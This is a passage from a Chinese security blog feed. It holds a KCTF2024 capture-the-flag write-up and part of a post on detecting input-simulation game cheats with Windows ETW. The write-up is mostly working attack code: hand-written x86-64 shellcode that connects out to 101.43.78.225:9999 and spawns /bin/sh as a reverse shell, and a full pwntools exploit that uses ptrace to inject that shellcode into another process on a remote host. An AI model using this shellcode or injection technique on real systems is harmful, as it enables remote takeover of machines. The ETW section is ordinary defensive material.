class="line">mov edi,2</span><br><span class="line">mov esi,1</span><br><span class="line">mov edx,0</span><br><span class="line">mov eax,41</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov r14,0xe14e2b650f270002</span><br><span class="line">mov r15,0x64</span><br><span class="line">mov r12,rsp</span><br><span class="line">mov [r12],r14</span><br><span class="line">mov [r12+8],r15</span><br><span class="line">mov r13,r12</span><br><span class="line">/*connect(sockfd,serveraddr,16)*/</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,r13</span><br><span class="line">mov edx,16</span><br><span class="line">mov eax,42</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=0) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=1) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 1</span><br><span class="line">pop rsi</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=2) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 2</span><br><span class="line">pop rsi</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* execve(path=&#x27;/bin/sh&#x27;, argv=0, envp=0) */</span><br><span class="line">/* push b&#x27;/bin/sh\x00&#x27; */</span><br><span class="line">mov rax, 0x101010101010101</span><br><span class="line">push rax</span><br><span class="line">mov rax, 0x101010101010101 ^ 0x68732f6e69622f</span><br><span class="line">xor [rsp], rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>其中 dup2 和 execve 都可以用 shellcraft 生成，socket 和 connect 需要自己配参数，因为你搜网上的教程大概率都是用一堆的宏。shellcraft 似乎不支持这个，所以需要手动去看看那些宏的值是多少。</p><p>至于 <code>0xe14e2b650f270002</code> 这个数怎么来的，可以直接 C 编译出去再看看的，C语言的写法是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddr</span>;</span></span><br><span class="line"><span class="type">int</span> clientSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//TCP listen</span></span><br><span class="line">serverAddr.sin_family = AF_INET;</span><br><span class="line">serverAddr.sin_port = htons(<span class="number">9999</span>);</span><br><span class="line">serverAddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;101.43.78.225&quot;</span>);</span><br><span class="line">connect(clientSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverAddr, <span class="keyword">sizeof</span>(serverAddr))</span><br></pre></td></tr></table></figure><p>编译，gdb调试</p><img src="/2024/09/02/KCTF2024/3.png" class=""><p>得到对应 <code>ip port</code> 的 <code>serverAddr</code> 的值。</p><p>这里需要注意的是，<code>connect</code> 中间需要构造一个 16 字节大小的结构体，然后传指针进去。这里一开始会比较头疼，因为你可能苦于没有确定可写的地址，但是后面想到 rsp 和 rbp 所指向的值通常是可写的，就往里面去写，然后把 rbp 作为这里的第二个参数。</p><p>然后就能得到手搓的 connect 代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov r14,0xe14e2b650f270002</span><br><span class="line">mov r15,0x64</span><br><span class="line">mov r12,rsp</span><br><span class="line">mov [r12],r14</span><br><span class="line">mov [r12+8],r15</span><br><span class="line">mov r13,r12</span><br><span class="line">/*connect(sockfd,serveraddr,16)*/</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,r13</span><br><span class="line">mov edx,16</span><br><span class="line">mov eax,42</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>将代码注入一个 demo 进程，反弹 shell 成功</p><img src="/2024/09/02/KCTF2024/4.png" class=""><h3 id="注入进程"><a href="#注入进程" class="headerlink" title="注入进程"></a>注入进程</h3><p>随后我们需要写一个可以利用 ptrace 将代码注入到另一个进程的 shellcode。</p><p>这里把上面编译好的 shellcode 放到  + 0x200 的位置上，方便做循环，然后开始编写注入代码，这里本地调试就假设我们已知我们要注入的进程的 pid。</p><p>这里可以写一个被注入进程的 demo。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pid=%d\n&quot;</span>,getpid());</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关 ptrace 的解析，可以看我这一篇<a href="https://xia0ji233.pro/2023/12/03/Ptrace/">文章</a>。首先我们要用 <code>PTRACE_ATTACH</code> 去附加这个进程，这里有一点很坑的地方是，它的第四个参数貌似不是 rcx 是 r10，并且用 shellcraft 生成也是这样，所以我在原有的基础上会加一句 <code>mov r10,rcx</code>。</p><p>所以第一步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*save mmap start addr*/</span><br><span class="line">push rdx</span><br><span class="line">/* ptrace(request=0x10, vararg_0=0x64, vararg_1=0, vararg_2=0) */</span><br><span class="line">mov edi,0x10/*ATTACH*/</span><br><span class="line">mov esi,&#123;pid&#125;</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rcx,0</span><br><span class="line">mov eax,SYS_ptrace /* 0x65 */</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>第一句是因为调用入口时 <code>call rdx</code> 因此这里先保存 mmap 分配的地址，方便给下面的寄存器使用。</p><p>第二步，因为在 ptrace 附加完成之后，进程会被阻塞，所以我们可以趁这个时机将 RIP 后面的代码布置成我们上面编写的 shellcode。所以这一步需要获取 RIP 的值。</p><p>ptrace 有获取寄存器的选项，<code>ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);</code></p><p>第四个参数是指针，我们随便给一个内存区域即可，这里我用了 +0x800 的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov edi,0xc /*GETREGS*/</span><br><span class="line">mov esi,&#123;pid&#125;</span><br><span class="line">mov rdx,0</span><br><span class="line">pop rcx</span><br><span class="line">push rcx</span><br><span class="line">add rcx,0x800</span><br><span class="line">mov r10,rcx</span><br><span class="line">mov eax,SYS_ptrace /* 0x65 */</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>接下来是获取当前目标进程 RIP 的值，这里可以直接看结构体定义算偏移，也可以直接 gdb 起一个看看偏移，实际它在结构体的偏移是 +0x80。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">push rcx</span><br><span class="line">add rcx,0x880</span><br><span class="line">mov rdx,[rcx]</span><br><span class="line">/*RIP offset*/</span><br></pre></td></tr></table></figure><p>接下来就用汇编写一个循环，ptrace 一次读写内存都是 8 个字节，并且需要注意的是，在写数据的时候，第四个参数不作为指针，而是直接作为一个字的数据被写入。</p><p>最后一点需要注意的是，shellcode 写入完成之后，要主动让进程脱离调试器，如果不管的话附加的进程死亡会导致被附加的进程一起死亡，shellcode不一定能被执行。</p><p>本地调试的时候可能会有一点麻烦，如果进程异常退出基本很难查到问题所在，因为一个进程不能同时被两个进程调试，因此我们需要调试附加的进程，每一次 ptrace 调用时查看返回值是否 &lt;0，我遇到的比较多的是返回 -5，当时是一个内存写入错误，仔细一查发现是汇编代码写错了一个，导致取到了错误的地址。</p><h2 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;usage: exp.py pid&#x27;</span>)</span><br><span class="line">    quit()</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">serveraddr=[<span class="number">0xe14e2b650f270002</span>,<span class="number">0x0000000000000064</span>]</span><br><span class="line"><span class="comment">#server struct</span></span><br><span class="line"><span class="comment">#target ip: 101.43.78.225:9999</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./test&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;47.101.191.23&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;0x&#x27;)</span></span><br><span class="line"><span class="comment">#addr=int(p.recv(12),16)</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x7f0000000000</span></span><br><span class="line">inject_shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*socket(AF_INET,SOCK_STREAM,0)*/</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">mov eax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,2</span></span><br><span class="line"><span class="string">mov esi,1</span></span><br><span class="line"><span class="string">mov edx,0</span></span><br><span class="line"><span class="string">mov eax,41</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r14,0xe14e2b650f270002</span></span><br><span class="line"><span class="string">mov r15,0x64</span></span><br><span class="line"><span class="string">mov r12,rsp</span></span><br><span class="line"><span class="string">mov [r12],r14</span></span><br><span class="line"><span class="string">mov [r12+8],r15</span></span><br><span class="line"><span class="string">mov r13,r12</span></span><br><span class="line"><span class="string">/*connect(sockfd,serveraddr,16)*/</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">mov rsi,r13</span></span><br><span class="line"><span class="string">mov edx,16</span></span><br><span class="line"><span class="string">mov eax,42</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=0) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=1) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=2) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* execve(path=&#x27;/bin/sh&#x27;, argv=0, envp=0) */</span></span><br><span class="line"><span class="string">/* push b&#x27;/bin/sh\x00&#x27; */</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101 ^ 0x68732f6e69622f</span></span><br><span class="line"><span class="string">xor [rsp], rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">/* call execve() */</span></span><br><span class="line"><span class="string">push SYS_execve /* 0x3b */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#print(len(asm(inject_shellcode)))</span></span><br><span class="line">inject_shellbytes=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">6</span>+asm(inject_shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;inject_shellcode: &#x27;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(inject_shellbytes)))</span><br><span class="line">pid=sys.argv[<span class="number">1</span>]</span><br><span class="line">shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*save mmap start addr*/</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">/* ptrace(request=0x10, vararg_0=0x64, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">mov edi,0x10/*ATTACH*/</span></span><br><span class="line"><span class="string">mov esi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rcx,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test ax,ax</span></span><br><span class="line"><span class="string">jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,0xc /*GETREGS*/</span></span><br><span class="line"><span class="string">mov esi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">add rcx,0x800</span></span><br><span class="line"><span class="string">mov r10,rcx</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">add rcx,0x880</span></span><br><span class="line"><span class="string">mov rdx,[rcx]</span></span><br><span class="line"><span class="string">/*RIP offset*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">add rcx,0x200</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">/*inject shellcode*/</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">mov rbx,0x100</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    mov edi,4/*pokedata*/</span></span><br><span class="line"><span class="string">    mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">    mov r10,[rcx]</span></span><br><span class="line"><span class="string">    mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    add rcx,8</span></span><br><span class="line"><span class="string">    add rdx,8</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    sub rbx,8</span></span><br><span class="line"><span class="string">    test rbx,rbx</span></span><br><span class="line"><span class="string">    jnz loop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,7</span></span><br><span class="line"><span class="string">mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov r10,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,17</span></span><br><span class="line"><span class="string">mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov r10,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=asm(shellcode).ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\0&#x27;</span>)+inject_shellbytes</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=inject_shellbytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.close()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>当时试了一个 pid&#x3D;17 就反弹成功了。</p><img src="/2024/09/02/KCTF2024/5.png" class=""><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>其实这题解法应该挺多的，因为直接给了 root 权限，所以直接去写启动的二进制文件也不是不可以，把沙箱代码 patch 掉直接shellcode执行 sh，或者不用反弹shell，直接 orw 出了 flag udp 直接发过来也可以，总归它出网想要外带信息还是非常容易的。</p>]]></content>
    
    
    <summary type="html">KCTF2024第八题——星门 writeup</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="KCTF" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/KCTF/"/>
    
    
  </entry>
  
  <entry>
    <title>etw机制分析</title>
    <link href="https://xia0ji233.github.io/2024/07/08/etw/"/>
    <id>https://xia0ji233.github.io/2024/07/08/etw/</id>
    <published>2024-07-08T02:00:00.000Z</published>
    <updated>2025-01-20T02:06:23.251Z</updated>
    
    <content type="html"><![CDATA[<p>尝试做一做模拟类外挂检测</p><span id="more"></span><h2 id="鼠标-键盘模拟监控"><a href="#鼠标-键盘模拟监控" class="headerlink" title="鼠标-键盘模拟监控"></a>鼠标-键盘模拟监控</h2><p>鼠标-键盘模拟外挂相较于直接读&#x2F;写内存的外挂相比，更加安全和可靠，因为它本质还是模拟人去操作的，只要频率设置不过分，那么不管是客户端检测还是服务端检测都是难以察觉的，因此这几天在思考一个可以检测这类外挂的方案。</p><h3 id="ETW"><a href="#ETW" class="headerlink" title="ETW"></a>ETW</h3><p>Windows (ETW) 的事件跟踪提供一种机制来跟踪和记录由用户模式应用程序和内核模式驱动程序引发的事件。 ETW 在 Windows 操作系统中实现，为开发人员提供了一组快速、可靠且通用的事件跟踪功能[1]。</p><p>经过深入的研究，发现 ETW 可以监控很多东西，上到进程创建，下到 UDP&#x2F;TCP 数据包监控，无所不能。</p><h3 id="想法构思"><a href="#想法构思" class="headerlink" title="想法构思"></a>想法构思</h3><p>那么既然 ETW 给了一种可以在 r3 层监控大量信息的机制，那么是否可以做到监控真实的键盘按键呢？如果能做到，配合 Windows 的消息监控便可以达到检测键盘-鼠标模拟的功能，因为鼠标模拟本质是直接通过 Windows API 发送消息，而不会经过键盘，所以如果检测到了按键消息而没有检测到真实按键的话，就可以判断为使用了鼠标-键盘模拟。</p><p>如果去搜索 etw 键盘监控，大概率是只能搜到这个 8 年前的老项目 <a href="https://github.com/CyberPoint/Ruxcon2016ETW%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%98%AF">https://github.com/CyberPoint/Ruxcon2016ETW，这个项目是</a> C# 写的，虽然可以运行，但是监控是监控不了一点的。</p><p>但是很幸运的是，有人发布了最新的键盘模拟检测 <a href="https://github.com/Oliver-1-1/EtwKeyboardDetection%EF%BC%8C%E7%84%B6%E8%80%8C%E6%88%91%E8%87%AA%E5%B7%B1%E6%B5%8B%E8%AF%95%E4%B8%8B%E6%9D%A5%E6%98%AF%E6%B2%A1%E6%9C%89%E6%95%88%E6%9E%9C%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%83%E7%9A%84%E6%A1%86%E6%9E%B6%E5%86%99%E7%9A%84%E8%BF%98%E6%98%AF%E9%9D%9E%E5%B8%B8%E4%B8%8D%E9%94%99%E7%9A%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%80%9F%E7%94%A8%E5%8F%82%E8%80%83%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%AE%83%E8%8E%B7%E5%8F%96%E4%BA%86">https://github.com/Oliver-1-1/EtwKeyboardDetection，然而我自己测试下来是没有效果的，但是它的框架写的还是非常不错的，可以借用参考一下，它获取了</a> Microsoft-Windows-USB-UCX 这个 provider 的全部事件。</p><p>这里参考一个<a href="https://github.com/performancecopilot/pcp/blob/main/src/pmdas/etw/tdhconsume.c">项目</a>的框架，去打印 event 的信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function">    <span class="title">PrintEventInfo</span><span class="params">(PTRACE_EVENT_INFO pInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (DecodingSourceWbem == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: MOF class event\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (DecodingSourceXMLFile == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: XML manifest event\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (DecodingSourceWPP == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: WPP event\n&quot;</span>);</span><br><span class="line">    <span class="comment">/*此处略去大量代码，具体信息可以查看项目代码*/</span></span><br><span class="line">    <span class="keyword">if</span> (pInfo-&gt;RelatedActivityIDNameOffset &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;Related activity ID name: %s\n&quot;</span>,</span><br><span class="line">                (LPWSTR)((PBYTE)(pInfo) + pInfo-&gt;RelatedActivityIDNameOffset));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它会刷新大量的 26 号和 27 号的事件</p><img src="/2024/07/08/etw/1.png" class=""><p>官方也提供了抓取 usb 事件的方式[2]。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">logman create trace -n usbtrace -o %SystemRoot%\Tracing\usbtrace.etl -nb 128 640 -bs 128</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBXHCI (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-UCX (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBHUB3 (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBPORT</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBHUB</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-Kernel-IoTrace 0 